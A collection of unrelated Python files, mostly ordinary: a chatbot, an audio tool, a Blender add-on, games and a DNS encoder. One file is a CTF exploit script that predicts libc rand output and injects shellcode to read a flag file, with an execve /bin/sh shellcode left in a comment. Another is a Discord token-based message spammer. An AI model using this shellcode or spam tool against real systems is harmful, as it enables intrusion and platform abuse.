    "from openai import OpenAI\nfrom gtts import gTTS\nfrom io import BytesIO\n#Using streamlit app framework\nimport streamlit as st\n\n#Creating client\nclient= OpenAI(\n    api_key=\"sk-1234567890\",\n    base_url='http://localhost:8000/v1'\n)\n# Title of the app\nst.title(\"TherapyBot- A Chatbot for Mental Health Support\")\n\nprompt= st.chat_input('How can I help you today?')\n\n#If users types prompt and hits enter\nif prompt:\n    st.chat_message(\"user\").markdown(prompt)\n    #Chat Completion\n    reponse= client.chat.completions.create(\n        #which model we wanna use\n        model='D:\\CHATBOT_PROJ_NEW\\MentaLLaMA-chat-7b-GGUF-q8\\MentaLLaMA-chat-7b-GGUF-q8.gguf',\n        #pass through the prompt\n        messages=[{\n            'role': 'user',\n            'content': prompt\n        }],\n        #Add streaming\n        stream=True\n    )\n    with st.chat_message(\"ai\"):\n        completed_message = \"\"\n        message= st.empty()\n        #Streaming the response out\n        for chunk in reponse:\n            if chunk.choices[0].delta.content is not None:\n                #print(chunk.choices[0].delta.content, flush=True, end=\"\")\n                completed_message += chunk.choices[0].delta.content\n                message.markdown(completed_message)\n        \n        sound_file = BytesIO()\n        tts = gTTS(completed_message, lang='en')\n        tts.write_to_fp(sound_file)\n        st.audio(sound_file)\n\n\n",
    "import librosa\nimport numpy as np\nimport os\nimport random\nimport soundfile as sf\n\nBPM = 73.96\nSECONDS_PER_BAR = 60 / BPM * 4  # Assuming 4 beats per bar\nTARGET_SAMPLE_RATE = 44100  # Target sample rate\nTOTAL_BARS = 41  # Total bars in the original song\nREUSE_DELAY_SECONDS = 15 * 60  # 10 minutes before a slice can be reused\n\n# Load an audio file with librosa\ndef load_audio(file_path, sr=TARGET_SAMPLE_RATE):\n    data, _ = librosa.load(file_path, sr=sr, mono=True)  # Ensure mono is True for consistent array shapes\n    return data\n\n# Load the original track\noriginal_data = load_audio('original.wav')\n\n# Discover and load slices, initializing play counts and last played times\nslices = {}\nslice_metadata = {}  # Additional metadata for each slice\nfor file in os.listdir('.'):\n    if file.startswith('slice') and file.endswith('.wav'):\n        parts = file.rstrip('.wav').split('_bar')\n        start_bar, end_bar = int(parts[1]), int(parts[2])\n        slice_data = load_audio(file)\n        slices[start_bar] = slices.get(start_bar, []) + [{'end_bar': end_bar, 'data': slice_data, 'filename': file}]\n        slice_metadata[file] = {'play_count': 0, 'last_played': None}\n\ndef get_available_slices(current_bar, current_time, slices, slice_metadata):\n    # Filter slices based on reuse delay and prioritize by play count\n    available_slices = [\n        s for s in slices.get(current_bar, [])\n        if slice_metadata[s['filename']]['last_played'] is None or\n        current_time - slice_metadata[s['filename']]['last_played'] >= REUSE_DELAY_SECONDS\n    ]\n    if not available_slices:\n        return []\n\n    # Prioritize slices that have been played the least\n    available_slices.sort(key=lambda s: slice_metadata[s['filename']]['play_count'])\n    return available_slices\n\ndef assemble_audio(duration_minutes, original_data, slices, slice_metadata):\n    total_seconds = duration_minutes * 60\n    current_bar = 1\n    assembled_audio = np.array([], dtype=np.float32)\n\n    while len(assembled_audio) / TARGET_SAMPLE_RATE < total_seconds:\n        available_slices = get_available_slices(current_bar, len(assembled_audio) / TARGET_SAMPLE_RATE, slices, slice_metadata)\n        \n        if available_slices and random.choice([True, True, True, True, False]):  # 50% chance to play a slice\n            selected_slice = random.choice(available_slices)\n            assembled_audio = np.concatenate((assembled_audio, selected_slice['data']))\n            # Update metadata for the selected slice\n            slice_metadata[selected_slice['filename']]['play_count'] += 1\n            slice_metadata[selected_slice['filename']]['last_played'] = len(assembled_audio) / TARGET_SAMPLE_RATE\n            current_bar = selected_slice['end_bar']  # Skip ahead to the end of the slice\n            continue\n\n        next_bar = current_bar + 1 if current_bar < TOTAL_BARS else 1  # Loop back to start if at end\n        start_sample = int((current_bar - 1) * SECONDS_PER_BAR * TARGET_SAMPLE_RATE)\n        end_sample = int((next_bar - 1) * SECONDS_PER_BAR * TARGET_SAMPLE_RATE)\n        original_segment = original_data[start_sample:end_sample]\n        assembled_audio = np.concatenate((assembled_audio, original_segment))\n        current_bar = next_bar\n\n    return assembled_audio\n\n# Assemble 30 minutes of audio as an example\nassembled_data = assemble_audio(30, original_data, slices, slice_metadata)\n\n# Save to a file\nsf.write('two_assembled_output.wav', assembled_data, TARGET_SAMPLE_RATE)\n",
    "from Excalibur2 import *\nimport ctypes\n\ndefault('m')\nproc('./hashshellcode')\nremo('127.0.0.1:38703')\n\nru('some hints:')\ndata = (ru(\"Now\").replace(b'\\n',b'')).decode().split(' ')[1]\nprint(data)\ndata = [int(num) for num in data.split(',')]\nprint(data)\npause()\nlibc = ctypes.CDLL(\"libc.so.6\")\n\nlibc.srand.argtypes = [ctypes.c_uint]\nresult = []\ni=0\nwhile True:\n    libc.srand(i)\n    # print(i)\n    for j in range(20):\n        result.append(libc.rand()%1000)\n    is_match = all(x == y for x, y in zip(data, result))\n    if is_match:\n        print(\"seed:\",i)\n        flag = libc.rand()%1000\n        print(\"next randnumber:\",flag)\n        break\n    else:\n        result = []\n    i+=1\n\n\npause()\nsla(b\"it's his\",str(flag))\n\n#shellcode = b'\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05'\n\n\nshellcode ='''\nnop\nnop\npush 0x67616c66\nmov rdi, rsp\nxor rdx, rdx\nxor rsi, rsi\npush 0x2\npop rax\nsyscall\n'''\n#shellcraft.open(\"flag\")\nshellcode += '''\npush 0x11\npop rax\npush 0x3\npop rdi\npush 0x64\npop rdx\npush 0x0\npop r10\npush rsp\npop rsi\nsyscall\n'''\nshellcode += shellcraft.write(1,'rsp', 100)\n\nshellcode = asm(shellcode)\n\n\n\npay = shellcode\nprint(len(pay))\n\n\n\nsla(b'flag',pay)\n\nia()\n\n\n",
    "import itertools\n\nfrom future import utils\nif utils.PY2:\n    from __builtin__ import max as _builtin_max, min as _builtin_min\nelse:\n    from builtins import max as _builtin_max, min as _builtin_min\n\n_SENTINEL = object()\n\n\ndef newmin(*args, **kwargs):\n    return new_min_max(_builtin_min, *args, **kwargs)\n\n\ndef newmax(*args, **kwargs):\n    return new_min_max(_builtin_max, *args, **kwargs)\n\n\ndef new_min_max(_builtin_func, *args, **kwargs):\n    \"\"\"\n    To support the argument \"default\" introduced in python 3.4 for min and max\n    :param _builtin_func: builtin min or builtin max\n    :param args:\n    :param kwargs:\n    :return: returns the min or max based on the arguments passed\n    \"\"\"\n\n    for key, _ in kwargs.items():\n        if key not in set(['key', 'default']):\n            raise TypeError('Illegal argument %s', key)\n\n    if len(args) == 0:\n        raise TypeError\n\n    if len(args) != 1 and kwargs.get('default', _SENTINEL) is not _SENTINEL:\n        raise TypeError\n\n    if len(args) == 1:\n        iterator = iter(args[0])\n        try:\n            first = next(iterator)\n        except StopIteration:\n            if kwargs.get('default', _SENTINEL) is not _SENTINEL:\n                return kwargs.get('default')\n            else:\n                raise ValueError('{}() arg is an empty sequence'.format(_builtin_func.__name__))\n        else:\n            iterator = itertools.chain([first], iterator)\n        if kwargs.get('key') is not None:\n            return _builtin_func(iterator, key=kwargs.get('key'))\n        else:\n            return _builtin_func(iterator)\n\n    if len(args) > 1:\n        if kwargs.get('key') is not None:\n            return _builtin_func(args, key=kwargs.get('key'))\n        else:\n            return _builtin_func(args)\n",
    "import bpy\n\n# Add-on information\nbl_info = {\n    \"name\": \"Ken Burns Effect\",\n    \"author\": \"Tintwotin\",\n    \"version\": (1, 0),\n    \"blender\": (3, 00, 0),\n    \"location\": \"Sequence Editor > Strip Tools\",\n    \"description\": \"Add Ken Burns effect to selected image or movie strips\",\n    \"warning\": \"\",\n    \"wiki_url\": \"\",\n    \"category\": \"Sequencer\"\n}\n\nclass AddKenBurnsEffect(bpy.types.Operator):\n    \"\"\"Add Ken Burns effect to selected image or movie strips\"\"\"\n    bl_idname = \"sequencer.add_ken_burns_effect\"\n    bl_label = \"Add Ken Burns Effect\"\n    \n    in_value: bpy.props.FloatProperty(name=\"In Value\", default=1.0, min=0.0)\n    out_value: bpy.props.FloatProperty(name=\"Out Value\", default=1.1, min=0.0)\n    \n    @classmethod\n    def poll(cls, context):\n        return context.area.type == 'SEQUENCE_EDITOR'\n\n    def execute(self, context):\n        strips = [strip for strip in bpy.context.selected_editable_sequences if strip.type in ['IMAGE', 'MOVIE']]\n        \n        for strip in strips:\n            # Insert keyframes for start and end offset\n            strip.transform.scale_x = self.in_value\n            strip.transform.scale_y = self.in_value\n            strip.transform.keyframe_insert(data_path=\"scale_x\", frame=strip.frame_final_start)\n            strip.transform.keyframe_insert(data_path=\"scale_y\", frame=strip.frame_final_start)\n            \n            strip.transform.scale_x = self.out_value\n            strip.transform.scale_y = self.out_value\n            strip.transform.keyframe_insert(data_path=\"scale_x\", frame=strip.frame_final_end)\n            strip.transform.keyframe_insert(data_path=\"scale_y\", frame=strip.frame_final_end)\n\n            # Set interpolation to \"VECTOR\" for smoother motion\n            for window in context.window_manager.windows:\n                screen = window.screen\n                for area in screen.areas:\n                    if area.type == 'GRAPH_EDITOR':\n                        with context.temp_override(window=window, area=area):\n                            bpy.ops.graph.handle_type(type='VECTOR')\n                        break\n\n        return {'FINISHED'}\n\nclass AddKenBurnsEffectPanel(bpy.types.Panel):\n    \"\"\"Panel for the Add Ken Burns Effect operator\"\"\"\n    bl_label = \"Add Ken Burns Effect\"\n    bl_idname = \"SCENE_PT_add_ken_burns_effect\"\n    bl_space_type = 'SEQUENCE_EDITOR'\n    bl_region_type = 'UI'\n    bl_category = 'Strip Tools'\n\n    def draw(self, context):\n        layout = self.layout\n        layout.prop(context.scene, \"in_value\")\n        layout.prop(context.scene, \"out_value\")\n        layout.operator(\"sequencer.add_ken_burns_effect\", text=\"Add Ken Burns Effect\")\n\ndef register():\n    bpy.types.Scene.in_value = bpy.props.FloatProperty(name=\"In Value\", default=1.0, min=0.0)\n    bpy.types.Scene.out_value = bpy.props.FloatProperty(name=\"Out Value\", default=1.1, min=0.0)\n    \n    bpy.utils.register_class(AddKenBurnsEffect)\n    bpy.utils.register_class(AddKenBurnsEffectPanel)\n\ndef unregister():\n    bpy.utils.unregister_class(AddKenBurnsEffect)\n    bpy.utils.unregister_class(AddKenBurnsEffectPanel)\n    del bpy.types.Scene.in_value\n    del bpy.types.Scene.out_value\n\nif __name__ == \"__main__\":\n    register()\n",
    "import pyautogui as pag\nfrom datetime import datetime\n\n\n\ndef userClick(x, y, clicks=1, interval=1):\n    pag.moveTo(x, y)\n    pag.sleep(0.5)\n    pag.click(clicks=clicks, interval=interval)\n\n\ndef update():\n    now = datetime.now()\n    dt_string = now.strftime(\"%d/%m/%Y %H:%M:%S\") + \" => \"\n\n    print(dt_string + \"Starting Coin collecting procedure\")\n    print(\"Proceeding to Page 1\")\n    userClick(802, 584, 2)  # Page 1\n\n    print(\"Collecting coins\")\n    userClick(963, 569)  # Collect MetaCoin\n\n    print(\"Proceeding to Page 2\")\n    userClick(1122, 565)  # Page 2\n\n    print(\"Trying to upgrade\")\n    userClick(958, 415)  # Try upgrade\n\n    print(\"Proceeding to Page 3\")\n    userClick(1122, 565)  # Fixer Page\n\n\ndef fix():\n    pos = pag.locateOnScreen(\"red_pane.png\", region=(714, 324, 500, 175))\n    now = datetime.now()\n    dt_string = now.strftime(\"%d/%m/%Y %H:%M:%S\") + \" => \"\n    print(dt_string + \"Red Pane Detected: Attempting to fix it\")\n    userClick(pos[0] + pos[2] // 2, pos[1] + pos[3] // 2)\n    userClick(100, 100)\n\n\nstart_time = datetime.now()\n\nwhile True:\n    if (datetime.now() - start_time).seconds > 2400:  # Do this every 40 minutes\n        start_time = datetime.now()\n        update()\n\n    try:\n        fix()\n    except:\n        pass\n\n",
    "import os\nimport argparse\nimport numpy as np\nfrom scripts.hybrik_loc2rot import HybrIKJointsToRotmat\nfrom scripts.pyrender import SMPLRender\nimport cv2\nfrom scipy.spatial.transform import Rotation as RRR\n\nparser = argparse.ArgumentParser(\n    description='Render a SMPL video by a j3ds npy file.')\nparser.add_argument('--input', type=str, default='', help='the npy file path')\nparser.add_argument('--render',\n                    type=int,\n                    default=1,\n                    help='render the video if 1')\nargs = parser.parse_args()\n\ninput_path = args.input\noutput_npy_path = args.input.replace('.npy', '_pose.npy')\ndata = np.load(input_path)\ndata = data - data[0, 0]\npose_generator = HybrIKJointsToRotmat()\npose = pose_generator(data)\npose = np.concatenate(\n    [pose, np.stack([np.stack([np.eye(3)] * pose.shape[0], 0)] * 2, 1)], 1)\nnp.save(output_npy_path, pose)\nshape = [768, 768]\nif args.render:\n    render = SMPLRender()\n    output_mp4_path = args.input.replace('.npy', '_smpl.mp4')\n    os.environ['PYOPENGL_PLATFORM'] = 'egl'\n    size = (shape[1], shape[0])\n    fps = 30.0\n    fourcc = cv2.VideoWriter_fourcc('M', 'P', '4', 'V')\n    videoWriter = cv2.VideoWriter(output_mp4_path, fourcc, fps, size)\n    r = RRR.from_rotvec(np.array([np.pi, 0.0, 0.0]))\n    pose[:, 0] = np.matmul(r.as_matrix().reshape(1, 3, 3), pose[:, 0])\n    for i in range(data.shape[0]):\n        img = np.zeros([shape[0], shape[1], 3])\n        aroot = data[[i], 0] + np.array([[0.0, 0.0, 30.0]])\n        aroot[:, 1] = -aroot[:, 1]\n        params = dict(pred_shape=np.zeros([1, 10]),\n                      pred_root=aroot,\n                      pred_pose=pose[[i]])\n        renderImg = render.render(img.copy(), params)\n        renderImg = (renderImg * 255).astype(np.uint8)\n        videoWriter.write(renderImg)\n    videoWriter.release()\n",
    "#!/home/lw/miniconda3/envs/RL/bin/python\r\n# a common file to run all exps\r\nimport sys\r\nimport numpy as np\r\nimport pandapower.networks\r\n\r\n# print('Python %s on %s' % (sys.version, sys.platform))\r\n# sys.path.extend(['/home/lw/RL_Qlearning', '/home/lw/RL_Qlearning'])\r\nimport os\r\nos.environ['CUDA_VISIBLE_DEVICES'] = \"0\"\r\nimport pprint\r\nimport tianshou as ts\r\nimport torch\r\nimport argparse\r\nfrom tianshou.utils.net.common import Net, ActorCritic\r\nfrom tianshou.policy import DQNPolicy, PPOPolicy, A2CPolicy\r\nfrom tianshou.data import VectorReplayBuffer\r\nfrom collector import Collector, AsyncCollector\r\nfrom utils import NewLogger as TensorboardLogger\r\nfrom offpolicy import offpolicy_trainer\r\nfrom onpolicy import onpolicy_trainer\r\nfrom single_transmission_graph_section import TransmissionSectionEnv as singleEnv  # single env for S4,S10 task\r\nfrom networks import SoftNet, MLPBase, SelfAttentionNetWeighted, SelfAttentionNetWeighted_Factor\r\nfrom tianshou.utils.net.discrete import Actor, Critic\r\nfrom torch.utils.tensorboard import SummaryWriter\r\n\r\n\r\ndef get_args():\r\n    parser = argparse.ArgumentParser()\r\n    parser.add_argument('--case', type=str, default='case118')  # case118, case300, case9241\r\n    parser.add_argument('--task', type=str, default='S10')  # S4, S10\r\n    parser.add_argument('--method', type=str, default='Powerformer')  # DQN, doubleDQN, duelingDQN, PPO, Powerformer, A2C\r\n    parser.add_argument('--model', type=str, default='Attention')  # Soft, Concat, Attention\r\n    parser.add_argument('--order', type=int, default=1)\r\n\r\n    # S4case118, S4case300, S10case118, S10case300, S10case9241\r\n    parser.add_argument('--env_id', type=str, default='None')\r\n    # int for random sections, list for fixes sections, e.g. 5 or [1, 2, 3, 7, 9]\r\n    parser.add_argument('--task_id', default=3)\r\n\r\n    parser.add_argument('--train_env_num', type=int, default=10)  # 10\r\n    parser.add_argument('--test_env_num', type=int, default=1)\r\n    parser.add_argument('--reward_threshold', type=float, default=99)\r\n    parser.add_argument('--render', type=float, default=0.)\r\n    parser.add_argument('--eps_train_high', type=float, default=1)\r\n    parser.add_argument('--eps_train_low', type=float, default=0.05)\r\n    parser.add_argument('--eps_train', type=float, default=0.1)\r\n    parser.add_argument('--eps_test', type=float, default=0)\r\n    parser.add_argument('--lr', type=float, default=0.001)\r\n    parser.add_argument('--max_epoch', type=int, default=25)\r\n    parser.add_argument('--step_per_epoch', type=int, default=40000)  # 2000\r\n    parser.add_argument('--step_per_collect', type=int, default=50)  # 50\r\n    parser.add_argument('--capacity', type=int, default=20000)\r\n    # parser.add_argument('--batch_size', type=int, default=64)\r\n    parser.add_argument('--batch_size', type=int, default=64)\r\n    parser.add_argument('--gamma', type=float, default=0.9)\r\n    parser.add_argument('--est_step', type=int, default=3)  # TD(lambda)\r\n    parser.add_argument('--episode_per_test', type=int, default=None)  # according to sample number of test env\r\n    parser.add_argument('--update_per_step', type=float, default=0.1)\r\n    parser.add_argument('--logdir', type=str, default='log')\r\n    parser.add_argument('--device', type=str, default='cuda' if torch.cuda.is_available() else 'cpu')\r\n    parser.add_argument('--dueling_param', default=None)\r\n    parser.add_argument('--is_double', default=True)\r\n    parser.add_argument(\r\n        # '--hidden_size', type=int, nargs='*', default=[128, 128]\r\n        '--hidden_size', type=int, nargs='*', default=[128]\r\n    )\r\n    # ppo special\r\n    parser.add_argument('--vf-coef', type=float, default=0.5)\r\n    parser.add_argument('--ent-coef', type=float, default=0.0)\r\n    parser.add_argument('--eps-clip', type=float, default=0.2)\r\n    parser.add_argument('--max-grad-norm', type=float, default=0.5)\r\n    parser.add_argument('--gae-lambda', type=float, default=0.95)\r\n    parser.add_argument('--rew-norm', type=int, default=1)\r\n    parser.add_argument('--norm-adv', type=int, default=1)\r\n    parser.add_argument('--recompute-adv', type=int, default=0)\r\n    parser.add_argument('--dual-clip', type=float, default=None)\r\n    parser.add_argument('--value-clip', type=int, default=1)\r\n    parser.add_argument('--resume-path', type=str, default=None)\r\n    parser.add_argument('--repeat-per-collect', type=int, default=2)\r\n\r\n    parser.add_argument('--hidden_type', type=str, default='GIN_Factor')\r\n\r\n    args = parser.parse_known_args()[0]\r\n    return args\r\n\r\n\r\ndef dqn(args=get_args()):\r\n    if args.order == 0:\r\n        assert False, 'Check the order'\r\n\r\n    if args.task == 'S10' or args.task == 'S4':\r\n        actEnv = singleEnv\r\n        args.task_id = 1\r\n    else:\r\n        assert False, 'task not in S4, S10'\r\n\r\n    args.env_id = args.task + args.case\r\n    print(args.env_id+'/'+args.method+'/'+args.model+'_'+str(args.order)+'_'+args.hidden_type)\r\n    env = actEnv(args, evaluation=True)\r\n    args.state_dim = env.observation_space.shape[0] or env.obs",
    "class NotepadGUI:\n    def __init__(self, root):\n        self.root = root\n        self.root.title(\"Notepad\")\n        \n        self.textarea = tk.Text(root, wrap=\"word\", undo=True)\n        self.textarea.pack(expand=True, fill=\"both\")\n        \n        self.menubar = tk.Menu(root)\n        self.filemenu = tk.Menu(self.menubar, tearoff=0)\n        self.editmenu = tk.Menu(self.menubar, tearoff=0)\n        self.helpmenu = tk.Menu(self.menubar, tearoff=0)\n        \n        self.filemenu.add_command(label=\"New\", command=lambda: backend.new_file(self.textarea))\n        self.filemenu.add_command(label=\"Open\", command=lambda: backend.open_file(self.textarea))\n        self.filemenu.add_command(label=\"Save\", command=lambda: backend.save_file(self.textarea))\n        self.filemenu.add_separator()\n        self.filemenu.add_command(label=\"Exit\", command=lambda: backend.quit_app(self.root))\n        \n        self.editmenu.add_command(label=\"Cut\", command=lambda: backend.cut_text(self.textarea))\n        self.editmenu.add_command(label=\"Copy\", command=lambda: backend.copy_text(self.textarea))\n        self.editmenu.add_command(label=\"Paste\", command=lambda: backend.paste_text(self.textarea))\n        \n        self.helpmenu.add_command(label=\"About Notepad\", command=self.about)\n        \n        self.menubar.add_cascade(label=\"File\", menu=self.filemenu)\n        self.menubar.add_cascade(label=\"Edit\", menu=self.editmenu)\n        self.menubar.add_cascade(label=\"Help\", menu=self.helpmenu)\n        \n        self.root.config(menu=self.menubar)\n        \n        self.scrollbar = tk.Scrollbar(self.textarea)\n        self.scrollbar.pack(side=\"right\", fill=\"y\")\n        self.scrollbar.config(command=self.textarea.yview)\n        self.textarea.config(yscrollcommand=self.scrollbar.set)\n    \n    def about(self):\n        messagebox.showinfo(\"About Notepad\", \"This is a simple notepad application.\")\n",
    "import random\r\n\r\n\r\ndef roll():\r\n    min_value = 1\r\n    max_value = 6\r\n    rolling = random.randint(min_value, max_value)\r\n\r\n    return rolling\r\n\r\n\r\nwhile True:\r\n    players = input(\"Wie viele Spieler spielen mit? (2-4): \")\r\n    if players.isdigit():\r\n        players = int(players)\r\n        if 2 <= players <= 4:\r\n            break\r\n        else:\r\n            print(\"Es k\u00f6nnen nur zwei bis vier Spieler mitspielen.\")\r\n    else:\r\n        print(\"Versuch es nochmal.\")\r\n\r\nmax_score = 50\r\nplayer_scores = [0 for _ in range(players)]\r\n\r\nwhile max(player_scores) < max_score:\r\n    for player_idx in range(players):\r\n        print(\"\\nSpieler\", player_idx + 1, \"ist jetzt dran!\\n\")\r\n        print(\"Dein Score betr\u00e4gt:\", player_scores[player_idx], \"\\n\")\r\n        current_score = 0\r\n\r\n        while True:\r\n            should_roll = input(\"\\nM\u00f6chtest du w\u00fcrfeln (y/n)? \")\r\n            if should_roll.lower() != \"y\":\r\n                break\r\n\r\n            value = roll()\r\n            if value == 1:\r\n                print(\"\\nDu hast eine 1 gew\u00fcrfelt! Der n\u00e4chste Spieler ist dran!\")\r\n                current_score = 0\r\n                break\r\n            else:\r\n                current_score += value\r\n                print(\"\\nDu hast eine\", value, \"gew\u00fcrfelt!\")\r\n\r\n            print(\"Dein Score betr\u00e4gt im Moment:\", current_score)\r\n\r\n        player_scores[player_idx] += current_score\r\n        print(\"\\nSpieler\", player_idx + 1, \"hat einen Score von:\", player_scores[player_idx])\r\n\r\nmax_score = max(player_scores)\r\nwinning_idx = player_scores.index(max_score)\r\nprint(\"Spieler\", winning_idx + 1, \"hat gewonnen mit einem Score von:\", max_score)\r\n",
    "import struct\nfrom enum import Enum\nfrom dataclasses import dataclass\nfrom io import BytesIO\n\nfrom .utils import encode_name, decode_name\n\n\nclass QType(int, Enum):\n    # A IPv4 host address\n    A = 1\n    # An authoritative name server\n    NS = 2\n    # A mail destination\n    MD = 3\n    # A mail forwarder\n    MF = 4\n    # The canonical name for an alias\n    CNAME = 5\n    # Marks the start of a zone of authority\n    SOA = 6\n    # A mailbox domain name\n    MB = 7\n    # A mail group member\n    MG = 8\n    # A mail rename domain name\n    MR = 9\n    # A null RR\n    NULL = 10\n    # A well known service description\n    WKS = 11\n    # A domain name pointer\n    PTR = 12\n    # Host information\n    HINFO = 13\n    # Mailbox or mail list information\n    MINFO = 14\n    # Mail exchange\n    MX = 15\n    # Text strings\n    TXT = 16\n    # A IPv6 host address\n    AAAA = 28\n\n\nclass QClass(int, Enum):\n    IN = 1  # Internet\n    CS = 2  # CSNET class\n    CH = 3  # CHAOS class\n    HS = 4  # Hesiod\n\n\n#   0  1  2  3  4  5  6  7  8  9  0  1  2  3  4  5\n# +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+\n# |                                               |\n# /                     QNAME                     /\n# /                                               /\n# +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+\n# |                     QTYPE                     |\n# +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+\n# |                     QCLASS                    |\n# +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+\n@dataclass\nclass Question:\n    \"\"\"The question section is used to carry the \"question\" in most\n    queries (the parameters that define what is being asked).\n    \"\"\"\n\n    # A domain name represented as a sequence of labels, where each\n    # label consists of a length octet followed by the number of octets\n    # The domain name terminates with the zero length octet\n    qname: bytes\n\n    # Type of record\n    qtype: QType\n\n    # Class of query\n    qclass: QClass\n\n    def encode(self) -> bytes:\n        return encode_name(self.qname) + struct.pack(\n            \"!HH\", self.qtype.value, self.qclass.value\n        )\n\n    @staticmethod\n    def decode(reader: BytesIO) -> \"Question\":\n        qname = decode_name(reader)\n        data = reader.read(4)\n        qtype, qclass = struct.unpack(\"!HH\", data)\n        return Question(qname=qname, qtype=QType(qtype), qclass=QClass(qclass))\n",
    "import requests,random,time,json\nfrom random import *\n\ntry:\n    with open (\"config.json\", 'r') as f:\n        setup = json.load(f)\n        token, cooldown, Cid = setup['TOKEN'], setup['COOLDOWN'], setup['CHANNEL_ID']\nexcept:\n    print(\"[Error] Json file not found. Try unzipping this file or downloading the config file\")\n\nif not token:\n    token = input(\"[!] Discord Token?: \")\ntry:\n    if not Cid:\n        Cid = input(\"[!] Target Channel Id?: \")\n    e = int(Cid)\n    Cid = str(Cid)\n    spam_times = input(\"[!] How Many Time Will The Message Be Sent?: \")\n    spam_times = int(spam_times)\n    if not cooldown:\n        cooldown = input(\"[!] Cooldown between message?: \")\n    try:\n        cooldown = int(cooldown)\n    except:\n        cooldown = float(cooldown)\nexcept:\n    print(\"[Error] Please input the right things or check the config file\")\n    exit()\nmessage = input(\"[!] Message Content?: \")\n\nglobal_headers = {\n    'authorization' : token,\n    'authority': 'discord.com',\n    'accept': '*/*',\n    'accept-language': 'sv,sv-SE;q=0.9',\n    'content-type': 'application/json',\n    'origin': 'https://discord.com',\n    'referer': 'https://discord.com/',\n    'sec-ch-ua': '\"Not?A_Brand\";v=\"8\", \"Chromium\";v=\"108\"',\n    'sec-ch-ua-mobile': '?0',\n    'sec-ch-ua-platform': '\"Windows\"',\n    'sec-fetch-dest': 'empty',\n    'sec-fetch-mode': 'cors',\n    'sec-fetch-site': 'same-origin',\n    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9016 Chrome/108.0.5359.215 Electron/22.3.12 Safari/537.36',\n    'x-debug-options': 'bugReporterEnabled',\n    'x-discord-locale': 'sv-SE',\n    'x-discord-timezone': 'Europe/Stockholm',\n}    \nerror_exit = 0\n\nfor i in(range(int(spam_times))): \n    payload ={\n    \"content\": message,\n    \"nonce\": randint(1, 100000),\n    \"tts\": False\n    }\n    r = requests.request(\"POST\", f\"https://discord.com/api/v9/channels/{Cid}/messages\", json = payload, headers = global_headers)\n    if r.status_code == 200:\n        print(f\"[Sucess] Message Sent in {Cid}\")\n    elif r.status_code == 401:\n        print(\"[Error] Your token might be invalid! Please check it\")\n        exit()\n    elif r.status_code == 403:\n        print(\"[Error] You might have been kicked out of the guild the token was previously sending message in, retrying...\")\n        error_exit +1\n        if error_exit == 5:\n            print(\"[Error] Exiting due to token being kicked from the guide\")\n            exit()\n    elif r.status_code == 429:\n        print(\"[Error] Spamming messages to fast! retrying...\")\n    else:\n        zzz = r.json()\n        print(f\"[Error] Error while performing, error staus code: {r.status_code}, here is the error: {zzz}\")\n        error_exit + 1\n        if error_exit == 5:\n            print(\"[Error] Too many errors while requests, exiting.\")\n            exit()\n    time.sleep(cooldown)\nprint(\"[Sucess] Finished Sending messages, exiting\")\nexit()\n",
    "from PIL import Image\r\nfrom datetime import datetime\r\nimport time, random, re, pyautogui, pytesseract, os, requests, subprocess, rpg,sys\r\n\r\napikey = \"Your GEMINI APIKEY here\"\r\nAdmin_name = ['RandSfk', 'Selvi']\r\nvalid_username = rpg.read_usernames()\r\n\r\npytesseract.pytesseract.tesseract_cmd = r'C:\\Program Files\\Tesseract-OCR\\tesseract.exe'\r\ncooldowns = {}\r\n\r\ndef read_usernames():\r\n    with open('name.txt', 'r') as file:\r\n        usernames = [line.strip() for line in file]\r\n    return usernames\r\n\r\ndef add_username(username):\r\n    with open('name.txt', 'r') as file:\r\n        usernames = [line.strip() for line in file]\r\n    if username.strip() not in usernames:\r\n        with open('name.txt', 'a') as file:\r\n            file.write(username.strip() + '\\n')\r\n        return(f\"Username '{username}' has been added successfully.\")\r\n    else:\r\n        return(f\"Username '{username}' already exists.\")\r\n        \r\ndef remove_username(username):\r\n    temp_file = 'name.txt'\r\n    with open('name.txt', 'r') as file, open(temp_file, 'w') as temp:\r\n        for line in file:\r\n            if line.strip() != username:\r\n                temp.write(line)\r\n    return(f\"Username '{username}' has been removed.\")\r\n\r\ndef is_on_cooldown(username):\r\n    if username in Admin_name:\r\n        return False\r\n    if username in cooldowns:\r\n        current_time = time.time()\r\n        cooldown_time = cooldowns[username]\r\n        if current_time - cooldown_time < 3600: \r\n            return True\r\n        else:\r\n            del cooldowns[username] \r\n    return False\r\ndef process_uang_kaget_command(username):\r\n    if not is_on_cooldown(username):\r\n        kirim_pesan(f\"Selamat {username}, anda mendapat uang sebesar:\")\r\n        kirim_pesan(\"/roll 100000000\")\r\n        cooldowns[username] = time.time()\r\n    else:\r\n        kirim_pesan(f\"{username}, Anda masih dalam cooldown. Silakan coba lagi nanti.\")\r\n\r\ndef process_thr_command(username, target):\r\n    if not is_on_cooldown(username):\r\n        kirim_pesan(f\"Selamat {target}, anda mendapat uang dari {username}, sebesar:\")\r\n        kirim_pesan(\"/roll 100000000\")\r\n        cooldowns[username] = time.time()\r\n    else:\r\n        kirim_pesan(f\"{username}, Anda masih dalam cooldown. Silakan coba lagi nanti.\")\r\n        \r\ndef process_quotes_command():\r\n    quotes = [\r\n        \"Jangan menyerah, karena saat menyerah, itu adalah awal dari kegagalan.\",\r\n        \"Hidup adalah apa yang terjadi saat kamu sibuk membuat rencana lain.\",\r\n        \"Satu-satunya cara untuk melakukan pekerjaan besar adalah mencintai apa yang kamu lakukan.\",\r\n        \"Di akhir, bukanlah tahun dalam hidupmu yang penting. Tetapi hidup dalam tahun-tahunmu.\",\r\n        \"Hanya ada satu hal yang harus kita takuti, yaitu ketakutan itu sendiri.\",\r\n        \"Anda akan melewatkan 100% dari tembakan yang tidak anda ambil.\",\r\n        \"Jadilah dirimu sendiri; orang lain sudah terlalu tersita.\",\r\n        \"Masa depan milik mereka yang percaya pada keindahan mimpinya.\",\r\n        \"Berjuang bukanlah untuk sukses, tetapi lebih baik untuk memberi nilai.\",\r\n        \"Saya tidak gagal. Saya hanya menemukan 10.000 cara yang tidak akan berhasil.\"\r\n    ]\r\n    